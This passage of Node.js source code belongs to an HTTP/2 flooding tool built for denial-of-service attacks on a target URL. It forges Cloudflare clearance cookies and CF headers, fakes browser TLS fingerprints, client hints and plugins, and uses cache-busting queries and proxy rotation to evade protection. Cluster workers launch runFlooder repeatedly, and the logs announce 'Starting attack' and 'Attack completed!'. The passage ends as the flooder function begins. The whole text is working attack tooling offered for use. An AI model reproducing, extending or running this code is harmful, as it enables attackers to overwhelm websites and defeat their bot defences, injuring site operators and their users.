    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": HTTP2_SETTINGS.HEADER_TABLE_SIZE,
        "SETTINGS_ENABLE_PUSH": HTTP2_SETTINGS.ENABLE_PUSH,
        "SETTINGS_MAX_CONCURRENT_STREAMS": HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS,
        "SETTINGS_INITIAL_WINDOW_SIZE": HTTP2_SETTINGS.INITIAL_WINDOW_SIZE,
        "SETTINGS_MAX_FRAME_SIZE": HTTP2_SETTINGS.MAX_FRAME_SIZE,
        "SETTINGS_MAX_HEADER_LIST_SIZE": HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE,
        "SETTINGS_ENABLE_CONNECT_PROTOCOL": HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL,
        "SETTINGS_NO_RFC7540_PRIORITIES": HTTP2_SETTINGS.NO_RFC7540_PRIORITIES,
        "SETTINGS_TLS_RENEG_PERMITTED": HTTP2_SETTINGS.TLS_RENEG_PERMITTED,
        "SETTINGS_ENABLE_METADATA": HTTP2_SETTINGS.ENABLE_METADATA
    };
    return settings.map(([key, value]) => [settingsMap[key] || key, value]);
};

const h2Settings = (browser) => {
    const baseSettings = { ...HTTP2_SETTINGS_DEFAULTS };
    
    const browserSettings = {
        chrome: {
            [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 65536,
            [HTTP2_SETTINGS.ENABLE_PUSH]: 0,
            [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: 1000,
            [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 6291456,
            [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384,
            [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: 262144,
            [HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL]: 1,
            [HTTP2_SETTINGS.NO_RFC7540_PRIORITIES]: 0,
            [HTTP2_SETTINGS.TLS_RENEG_PERMITTED]: 0,
            [HTTP2_SETTINGS.ENABLE_METADATA]: 0
        },
        firefox: {
            [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 65536,
            [HTTP2_SETTINGS.ENABLE_PUSH]: 0,
            [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: 128,
            [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 131072,
            [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384,
            [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: 65536,
            [HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL]: 1,
            [HTTP2_SETTINGS.NO_RFC7540_PRIORITIES]: 0,
            [HTTP2_SETTINGS.TLS_RENEG_PERMITTED]: 0,
            [HTTP2_SETTINGS.ENABLE_METADATA]: 0
        }
    };

    const settings = [];
    const selectedSettings = browserSettings[browser] || browserSettings.chrome;
    
    for (const [key, value] of Object.entries(selectedSettings)) {
        const settingName = Object.entries(HTTP2_SETTINGS).find(([name, code]) => code == key)?.[0];
        if (settingName) {
            settings.push([`SETTINGS_${settingName}`, value]);
        }
    }
    
    return Object.fromEntries(settings);
};

function generateBypassCookie() {
    const timestampString = Math.floor(Date.now() / 1000);
    return `cf_clearance=${randstr(22)}_${randstr(1)}.${randstr(3)}.${randstr(14)}-${timestampString}-1.2.1.1-${randstr(6)}+${randstr(80)}=`;
}

function bypassCache(hostname, path) {
    const result = {
        headers: {},
        path: '',
        queryString: '',
        randomizedPath: ''
    };
    
    if (!options.cache) {
        return result;
    }
    
    try {
        result.headers = generateCacheHeaders();
        result.queryString = generateRandomQueryString(path);
        result.randomizedPath = generateRandomPath(path);
        result.fullPath = result.randomizedPath + result.queryString;
        return result;
    } catch (error) {
        trackCacheError(error);
        return { headers: {}, path: '', queryString: '', randomizedPath: '' };
    }
}

function generateCacheHeaders() {
    const headers = {};
    
    headers["cache-control"] = randomElement([
        "no-cache, no-store, must-revalidate, max-age=0",
        "max-age=0, no-cache, no-store, must-revalidate",
        "no-store, no-cache, must-revalidate, proxy-revalidate",
        "no-cache, must-revalidate, proxy-revalidate, max-age=0"
    ]);
    
    headers["pragma"] = "no-cache";
    headers["expires"] = "0";
    headers["x-cache-buster"] = randstr(10);
    
    const additionalHeaderCount = Math.floor(Math.random() * 3);
    
    const possibleHeaders = [
        () => {
            headers["CF-Cache-Status"] = randomElement(["BYPASS", "DYNAMIC", "EXPIRED"]);
        },
        () => {
            headers["CF-IPCountry"] = randomElement(["US", "GB", "DE", "FR", "JP", "AU", "CA"]);
        },
        () => {
            const rayId = randstr(16).toLowerCase();
            headers["CF-RAY"] = `${rayId}-${randomElement(["FRA", "AMS", "LHR", "CDG"])}`;
        },
        () => {
            headers["Age"] = "0";
        }
    ];
    
    const selectedIndices = new Set();
    while (selectedIndices.size < additionalHeaderCount && selectedIndices.size < possibleHeaders.length) {
        const randomIndex = Math.floor(Math.random() * possibleHeaders.length);
        if (!selectedIndices.has(randomIndex)) {
            selectedIndices.add(randomIndex);
            try {
                possibleHeaders[randomIndex]();
            } catch (e) {}
        }
    }
    
    return headers;
}

function generateRandomQueryString(originalPath) {
    try {
        const timestamp = Date.now();
    let queryParams = [];
    
        const timeParamNames = ["_", "t", "ts", "time", "timestamp", "cache"];
        queryParams.push(`${randomElement(timeParamNames)}=${timestamp}`);
    
        const numParams = Math.floor(Math.random() * 3) + 1;
    for (let i = 0; i < numParams; i++) {
            const paramName = randstr(4).toLowerCase();
            const paramValue = randstr(5);
            queryParams.push(`${paramName}=${paramValue}`);
        }
        
        const queryString = queryParams.join('&');
        return originalPath.includes('?') ? '&' + queryString : '?' + queryString;
    } catch (error) {
        console.log(`\x1b[31m[ERROR]\x1b[0m Query string generation error: ${error.message}`);
        return originalPath.includes('?') ? '&_=' + Date.now() : '?_=' + Date.now();
    }
}

function generateRandomPath(originalPath) {
    try {
        if (Math.random() < 0.8) {
            return originalPath;
        }
        
        let basePath = originalPath.split('?')[0];
        return basePath + '/' + randstr(5).toLowerCase();
    } catch (error) {
        console.log(`\x1b[31m[ERROR]\x1b[0m Path modification error: ${error.message}`);
        return originalPath;
    }
}

function generateFakePlugins(browser) {
    const pdfPlugins = [
        {name: "Chrome PDF Plugin", description: "Portable Document Format", filename: "internal-pdf-viewer", mimeTypes: ["application/pdf"]},
        {name: "PDF.js", description: "Portable Document Format", filename: "pdf.js", mimeTypes: ["application/pdf"]}
    ];
    
    const flashPlugins = [
        {name: "Shockwave Flash", description: "Shockwave Flash 32.0 r0", filename: "pepflashplayer.dll", mimeTypes: ["application/x-shockwave-flash"]}
    ];
    
    const mediaPlugins = [
        {name: "QuickTime Plug-in", description: "The QuickTime Plugin allows you to view a wide variety of multimedia", filename: "npqtplugin.dll", mimeTypes: ["video/quicktime", "image/x-macpaint", "image/x-quicktime"]},
        {name: "VLC Web Plugin", description: "VLC Web Plugin", filename: "npvlc.dll", mimeTypes: ["application/x-vlc-plugin", "video/x-msvideo"]},
        {name: "Windows Media Player Plug-in", description: "Windows Media Player Plugin", filename: "np-mswmp.dll", mimeTypes: ["application/x-ms-wmp", "video/x-ms-asf"]}
    ];
    
    const chromePlugins = [
        {name: "Native Client", description: "Native Client", filename: "internal-nacl-plugin", mimeTypes: ["application/x-nacl", "application/x-pnacl"]},
        {name: "Chrome Remote Desktop Viewer", description: "This plugin allows you to securely access other computers", filename: "internal-remoting-viewer", mimeTypes: ["application/vnd.chromium.remoting-viewer"]}
    ];
    
    const firefoxPlugins = [
        {name: "Widevine Content Decryption Module", description: "Enables Widevine licenses for playback of HTML audio/video content.", filename: "libwidevinecdm.so", mimeTypes: ["application/x-ppapi-widevine-cdm"]},
        {name: "OpenH264 Video Codec", description: "OpenH264 Video Codec provided by Cisco Systems, Inc.", filename: "openh264.dll", mimeTypes: ["video/h264"]}
    ];
    
    let plugins = [...pdfPlugins];
    
    if (browser === 'chrome') {
        plugins = [...plugins, ...chromePlugins];
        if (Math.random() < 0.7) {
            plugins.push(mediaPlugins[Math.floor(Math.random() * mediaPlugins.length)]);
        }
    } else {
        plugins = [...plugins, ...firefoxPlugins];
    }
    
    if (Math.random() < 0.2) {
        plugins.push(flashPlugins[0]);
    }
    
    const pluginsInfo = plugins.map(plugin => {
        return {
            name: plugin.name,
            description: plugin.description,
            mimeTypes: plugin.mimeTypes.join(',')
        };
    });
    
    return {
        count: plugins.length,
        list: pluginsInfo
    };
}

function addPluginHeaders(headers, browser) {
    const plugins = generateFakePlugins(browser);
    
    const pluginData = Buffer.from(JSON.stringify(plugins)).toString('base64');
    
    headers["sec-ch-ua-plugins"] = `"Plugins: ${plugins.count}"`;
    
    const randomId = Math.floor(Math.random() * 1000000);
    headers["x-plugins-data"] = `id=${randomId};count=${plugins.count}`;
    
    if (Math.random() < 0.7) {
        headers["sec-ch-ua-full-version-list"] += `;v="plugins:${plugins.count}"`;
    }
    
    return headers;
}

const generateHeaders = (browser, parsedTarget) => {
    const versions = {
        chrome: { min: 136, max: 136 },
        firefox: { min: 118, max: 118 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    
    const fullVersions = {
        chrome: `${version}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        firefox: `${version}.0`
    };

    const brandsList = {
        chrome: [
            { brand: "Chromium", version: fullVersions.chrome.split('.')[0] },
            { brand: "Google Chrome", version: fullVersions.chrome.split('.')[0] },
            { brand: "Not:A-Brand", version: "99" }
        ],
        firefox: [
            { brand: "Firefox", version: fullVersions.firefox },
            { brand: "Gecko", version: "20100101" }
        ]
    };

    const secChUA = brandsList[browser]
        .map(b => `"${b.brand}";v="${b.version}"`)
        .join(", ");

    const secChUAFullVersionList = brandsList[browser]
        .map(b => `"${b.brand}";v="${b.version}.0.0.0"`)
        .join(", ");
        
    const platforms = {
        chrome: "Win64",
        firefox: "Win64"
    };
    const platform = platforms[browser];

    const userAgents = {
        chrome: `Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/138.0 Mobile/15E148 Safari/605.1.15`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0`
    };
    
    if (options.userAgent) {
        userAgents.chrome = options.userAgent;
        userAgents.firefox = options.userAgent;
    }
    else if (options.fakebot) {
        const botUserAgent = botUserAgents[Math.floor(Math.random() * botUserAgents.length)];
        userAgents.chrome = botUserAgent;
        userAgents.firefox = botUserAgent;
    }

    const bypassCookie = options.bfm ? generateBypassCookie() : '';
    
    let cookieHeader = '';
    
    if (options.bfm && bypassCookie) {
        cookieHeader = bypassCookie;
    }
    
    if (options.manualCookie) {
        cookieHeader = cookieHeader ? `${cookieHeader}; ${options.manualCookie}` : options.manualCookie;
    }
    else if ((options.cookie || options.autoCookie) && targetCookies) {
        cookieHeader = cookieHeader ? `${cookieHeader}; ${targetCookies}` : targetCookies;
    }

    let cacheBypass = { headers: {}, queryString: '' };
    try {
        if (options.cache) {
            cacheBypass = bypassCache(parsedTarget.host, parsedTarget.path);
        }
    } catch (error) {
        trackCacheError(error);
    }

    const cacheHeadersMap = {
        chrome: {
            ...(options.cache ? cacheBypass.headers : {})
        },
        firefox: {
            ...(options.cache ? cacheBypass.headers : {})
        }
    };

    const headersMap = {
        chrome: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path,
            ...(options.cache && cacheBypass.queryString ? { ":path": parsedTarget.path + cacheBypass.queryString } : {}),

            "sec-ch-ua": `"Firefox";v="138", "iOS";v="17"`,
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": `"iOS"`,
            "sec-ch-ua-platform-version": `"17.7.2"`,
            "sec-ch-ua-model": `"iPhone"`,
            "sec-ch-ua-full-version-list": `"Firefox";v="138.0.0.0", "iOS";v="17.7.2"`,
            "user-agent": userAgents[browser],
            
            ...(cookieHeader ? {"cookie": cookieHeader} : {}),

            "accept":  accept_header[Math.floor(Math.random() * accept_header.length)],
            "accept-language": [
                "en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", 
                "es-ES,es;q=0.7", "de-DE,de;q=0.9", "ja-JP,ja;q=0.8"
            ][Math.floor(Math.random() * 6)],

            "accept-encoding": [
                "gzip, deflate, br", "gzip, deflate, zstd, br", 
                "gzip, br, deflate", "br, gzip, zstd"
            ][Math.floor(Math.random() * 4)],

            ...generateAlternativeIPHeaders(),

            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": ["same-origin", "same-site", "cross-site", "none"][Math.floor(Math.random() * 4)],

            ...cacheHeadersMap[browser],
                
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
            "te": "trailers",
            "priority": `"u=0, i"`,

            ...(options.referrer ? {
                "referer": Math.random() < 0.5 ? 
                    "https://cloudflare.com/" : 
                    `https://${parsedTarget.host}/`
            } : {}),
        },
        firefox: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path,
            ...(options.cache && cacheBypass.queryString ? { ":path": parsedTarget.path + cacheBypass.queryString } : {}),
                
            "sec-ch-ua": secChUA,
            "sec-ch-ua-mobile": Math.random() < 0.4 ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platforms[browser]}"`,
            "user-agent": userAgents[browser],
            
            ...(cookieHeader ? {"cookie": cookieHeader} : {}),

            "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
            "accept-language": "en-US,en;q=0.5",
            "accept-encoding": "gzip, deflate, br",

            ...generateAlternativeIPHeaders(),

            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",

            ...cacheHeadersMap[browser],
            
            "upgrade-insecure-requests": "1",
            "priority": "u=0, i",
            "te": "trailers",

            ...(options.referrer ? {
                "referer": Math.random() < 0.5 ? 
                    "https://cloudflare.com/" : 
                    `https://${parsedTarget.host}/`
            } : {}),
        }
    };

    const headers = addPluginHeaders(headersMap[browser], browser);

    return headers;
};

if (process.argv.length < 6) {
console.log(`Usage: <target> <time> <rate> <threads> <proxy-file/null> [options]

Options:
  --bfm true/false            Bypass BFM cookie (default: false)
  --cache true/false          Bypass cache (default: false)
  --debug true/false          Show debug headers (default: false)
  --ratelimit <number>        Max requests per proxy (default: unlimited)
  --autoratelimit true/false Auto rate limit (default: false)
  --Referrer true/false       Add alternating referrer (default: false)
  --auth                      proxy ip:port:user:pass (shiro)


`);
  process.exit();
}

const cplist = [
  "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA",
  "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
  "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256",
  "TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
  "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA"
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
const ciphers = cipper;

const sigalgs = [
       'ecdsa_secp256r1_sha256',
       'ecdsa_secp384r1_sha384',
       'ecdsa_secp521r1_sha512',
       'rsa_pss_rsae_sha256',
       'rsa_pss_rsae_sha384',
       'rsa_pss_rsae_sha512',
       'rsa_pkcs1_sha256',
       'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];
let SignalsList = sigalgs.join(':');

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol,
    enablePriority: true
};

const secureContext = tls.createSecureContext(secureContextOptions);

const shuffleObject = (obj) => {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const shuffledObj = {};
    keys.forEach(key => shuffledObj[key] = obj[key]);
    return shuffledObj;
};

function generateJA3Fingerprint(browser) {
    const ja3Strings = {
        chrome: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,35-18-16-43-65037-23-5-51-65281-0-27-45-11-10-13-17613,4588-29-23-24,0",
        firefox: "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-16-5-34-18-51-43-13-45-28-27-65037-41,4588-29-23-24-25-256-257,0"
    };
    
    const ja3String = ja3Strings[browser];
    
    const hash = crypto.createHash('md5');
    hash.update(ja3String);
    const ja3Hash = hash.digest('hex');
    
    const [tls_version, cipherSuitesStr, extensionsStr, ecCurvesStr, ecPointFormatsStr] = ja3String.split(',');

    return {
        ja3: ja3String,
        ja3_hash: ja3Hash,
        ja3String: ja3String,
        ja3Hash: ja3Hash,
        components: {
            tls_version: tls_version,
            cipherSuites: cipherSuitesStr.split('-'),
            extensions: extensionsStr.split('-'),
            ecCurves: ecCurvesStr.split('-'),
            ecPointFormats: ecPointFormatsStr.split('-')
        }
    };
}

function generateJA4Fingerprint(browserType) {
    const browserProfiles = {
        chrome: {
            quic: 'c13f',
            alpnList: ['h2', 'http/1.1'],
            signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256'],
            extensionsOrder: ['0', '5', '10', '11', '13', '16', '21', '23', '28', '35', '65281']
        },
        firefox: {
            quic: 'c13f',
            alpnList: ['h2', 'http/1.1'],
            signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256'],
            extensionsOrder: ['0', '5', '10', '11', '13', '16', '21', '23', '28', '35', '65281']
        }
    };
    
    const profile = browserProfiles[browserType] || browserProfiles.chrome;
    
    const alpnStr = profile.alpnList[0].length.toString().padStart(2, '0') + profile.alpnList[0];
    
    const sigAlgCount = 2;
    const sigAlgStr = profile.signatureAlgorithms.slice(0, sigAlgCount).join('_').substring(0, 4);
    
    const extHash = profile.extensionsOrder.map(e => e.charAt(0)).join('').substring(0, 8);
    
    const ja4 = `${profile.quic}_${alpnStr}_${sigAlgStr}_${extHash}`;
    
    const hash = crypto.createHash('md5');
    hash.update(ja4);
    const ja4Hash = hash.digest('hex').substring(0, 16);
    
    return {
        ja4: ja4,
        ja4_hash: ja4Hash
    };
}

function createRealisticClientHello(browser) {
    const ja3Data = generateJA3Fingerprint(browser);
    const ja4Data = generateJA4Fingerprint(browser);
    
    const plugins = generateFakePlugins(browser);
    
    let tlsVersions;
    if (browser === 'chrome') {
        tlsVersions = { min: "TLSv1.2", max: "TLSv1.3" };
    } else {
        tlsVersions = { min: "TLSv1.2", max: "TLSv1.3" };
    }
    
    const addCloudflareGrease = Math.random() < 0.7;
    
    const cipherList = browser === 'chrome' ? 
        "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305" :
        "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305";
    
    const alpnProtocols = ['h2', 'http/1.1'];
    
    let ecdhCurve;
    if (addCloudflareGrease) {
        ecdhCurve = "GREASE:X25519:secp256r1:secp384r1:secp521r1";
    } else {
        ecdhCurve = "X25519:secp256r1:secp384r1:secp521r1";
    }
    
    let appData = "";
    if (plugins && plugins.count > 0) {
        const pluginNames = plugins.list.map(p => p.name.substring(0, 3)).join('');
        appData = `${browser}-${plugins.count}-${pluginNames}`;
    }
    
    return {
        tlsVersions: tlsVersions,
        ciphers: cipherList,
        ecdhCurve: ecdhCurve,
        alpnProtocols: alpnProtocols,
        ja3: ja3Data,
        ja4: ja4Data,
        signatureAlgorithms: browser === 'chrome' ?
            'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384' :
            'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha256',
        plugins: plugins,
        appData: appData
    };
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

var proxies = [];
if (options.customProxy) {
    proxies = [options.customProxy];
    console.log(`\x1b[36m[INFO]\x1b[0m Using custom proxy: ${options.customProxy}`);
} else if (args.proxyFile && args.proxyFile.toLowerCase() !== 'null') {
    proxies = readLines(args.proxyFile);
} else {
    console.log(`\x1b[31m[ERROR]\x1b[0m No proxy specified. Please use --proxy option or provide a proxy file.`);
    process.exit(1);
}

const parsedTarget = url.parse(args.target);
colors.enable();
if (cluster.isMaster) {
   console.clear();
 console.log('Target: '+process.argv[2]);
 console.log('Time: '+process.argv[3]);
 console.log('Rate: '+process.argv[4]);
 console.log('Thread(s): '+process.argv[5]);
 
 if (options.customProxy) {
   console.log(`Custom Proxy: ${options.customProxy}`);
 } else {
 console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
 }
 
 let authProxies = 0;
 proxies.forEach(proxy => {
   if (proxy.includes('@')) authProxies++;
 });
 if (authProxies > 0) {
   console.log(`Proxy Authentication: ${authProxies}/${proxies.length} proxies using authentication`);
 }
 
 console.log(`BFM (Bypass Cookie): ${options.bfm ? 'Enabled' : 'Disabled'}`);
 console.log(`Auto Cookie Fetch: ${options.cookie ? 'Enabled' : 'Disabled'}`);
 console.log(`Auto Cookie File: ${options.autoCookie ? 'Enabled' : 'Disabled'}`);
 console.log(`Cache Bypass: ${options.cache ? 'Enabled' : 'Disabled'}`);
 console.log(`Debug Mode: ${options.debug ? 'Enabled' : 'Disabled'}`);
 
 if (options.userAgent) {
 } else {
 console.log(`Fakebot: ${options.fakebot ? 'Enabled' : 'Disabled'}`);
 }
 
 console.log(`Rate Limit Per IP: ${options.ratelimit ? options.ratelimit + ' req/IP' : options.autoratelimit ? 'Auto' : 'Disabled'}`);
 console.log(`Referrer Spoof: ${options.referrer ? 'Enabled' : 'Disabled'}`);
 console.log(`Proxy Auth (ip:port:user:pass): ${options.auth ? 'Enabled' : 'Disabled'}`);
 if (options.manualCookie) {
   console.log(`Manual Cookie: ${options.manualCookie.substring(0, 30)}...`);
 }
   
   const restartScript = () => {
       for (const id in cluster.workers) {
           cluster.workers[id].kill();
       }

       console.log(`\x1b[33m[SYSTEM]\x1b[0m Restarting workers due to high RAM usage...`);
       for (let counter = 1; counter <= args.threads; counter++) {
           cluster.fork();
       }
   };

   const handleRAMUsage = () => {
       const totalRAM = os.totalmem();
       const usedRAM = totalRAM - os.freemem();
       const ramPercentage = (usedRAM / totalRAM) * 100;

       const now = Date.now();
       if (!handleRAMUsage.lastLog || now - handleRAMUsage.lastLog > 30000) {
           if (ramPercentage > 80) {
               console.log(`\x1b[36m[INFO]\x1b[0m RAM usage: ${ramPercentage.toFixed(2)}%`);
               handleRAMUsage.lastLog = now;
           }
       }

       if (ramPercentage >= MAX_RAM_PERCENTAGE) {
           console.log(`\x1b[31m[WARNING]\x1b[0m Maximum RAM usage reached: ${ramPercentage.toFixed(2)}%`);
           restartScript();
       }
   };
   
   setInterval(handleRAMUsage, 5000);
   
   if (options.autoCookie) {
     const cookieFromFile = getCookieFromFile(args.target);
     if (cookieFromFile) {
       targetCookies = cookieFromFile;
       console.log(`\x1b[32m[SUCCESS]\x1b[0m Using cookies from file: ${targetCookies.substring(0, 50)}${targetCookies.length > 50 ? '...' : ''}`);
       
       for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
       }
     } else {
       console.log(`\x1b[33m[INFO]\x1b[0m No cookie file found for ${args.target}, running getcookie.js...`);
       
       runGetCookieScript(args.target).then(success => {
         const newCookieFromFile = getCookieFromFile(args.target);
         if (newCookieFromFile) {
           targetCookies = newCookieFromFile;
           console.log(`\x1b[32m[SUCCESS]\x1b[0m Using cookies from file: ${targetCookies.substring(0, 50)}${targetCookies.length > 50 ? '...' : ''}`);
         } else {
           console.log(`\x1b[33m[WARNING]\x1b[0m Could not get cookies from getcookie.js, starting attack without cookies`);
         }
         
         for (let counter = 1; counter <= args.threads; counter++) {
           cluster.fork();
         }
       });
     }
   }
   
   else if (options.cookie && !options.autoCookie) {
     console.log(`\x1b[33m[INFO]\x1b[0m Fetching cookies from target...`);
     fetchCookiesFromTarget(args.target).then(cookies => {
       targetCookies = cookies;
       if (targetCookies) {
         console.log(`\x1b[32m[SUCCESS]\x1b[0m Cookies fetched: ${targetCookies.substring(0, 50)}${targetCookies.length > 50 ? '...' : ''}`);
       } else {
         console.log(`\x1b[33m[WARNING]\x1b[0m No cookies found or couldn't fetch cookies from target`);
       }
       for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
       }
     });
   } else {
     console.log(`\x1b[36m[INFO]\x1b[0m Starting attack without cookie fetching...`);
     for (let counter = 1; counter <= args.threads; counter++) {
       cluster.fork();
     }
   }

   console.log(`\x1b[33m[SYSTEM]\x1b[0m Optimizing TCP parameters for better performance...`);
   TCP_CHANGES_SERVER();
    
   const statsInterval = setInterval(printStats, 1000);
    
   setTimeout(() => {
     clearInterval(statsInterval);
     printStats();
     console.log("\x1b[32m[SUCCESS]\x1b[0m Attack completed!");
     process.exit(0);
   }, args.time * 1000);
    
   cluster.on('message', (worker, message) => {
     if (message && message.type === 'status_code' && message.code) {
       if (!stats.statusCodes[message.code]) {
         stats.statusCodes[message.code] = 0;
       }
       stats.statusCodes[message.code]++;
     }
     if (message && message.type === 'error') {
       stats.errors++;
     }
     if (message && message.type === 'retry_after') {
       stats.totalRetryAfters += message.value;
     }
   });
} else {
   runFlooder();
   
   for (let i = 0; i < 10; i++) { 
     setInterval(runFlooder, 1);
   }
}

function runFlooder() {
